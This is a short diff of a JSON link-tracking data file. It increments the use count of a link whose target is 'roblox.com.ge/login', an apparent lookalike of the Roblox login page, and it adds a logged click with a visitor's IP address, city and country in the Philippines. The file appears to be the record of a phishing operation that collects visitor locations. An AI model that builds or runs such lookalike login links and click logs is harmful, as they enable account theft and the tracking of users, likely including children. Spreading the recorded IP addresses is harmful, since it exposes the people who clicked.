@@ -142,7 +142,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1238,
+    "useCount": 1239,
     "createdBy": "admin",
     "clicks": [
       {
@@ -10046,6 +10046,14 @@
         "ip": "180.190.186.166",
         "country": "Philippines",
         "city": "Lahug",
+        "flag": "🇵🇭",
+        "countryCode": "PH"
+      },
+      {
+        "timestamp": 1777337566858,
+        "ip": "49.150.105.48",
+        "country": "Philippines",
+        "city": "Baguio City",
         "flag": "🇵🇭",
         "countryCode": "PH"
       }
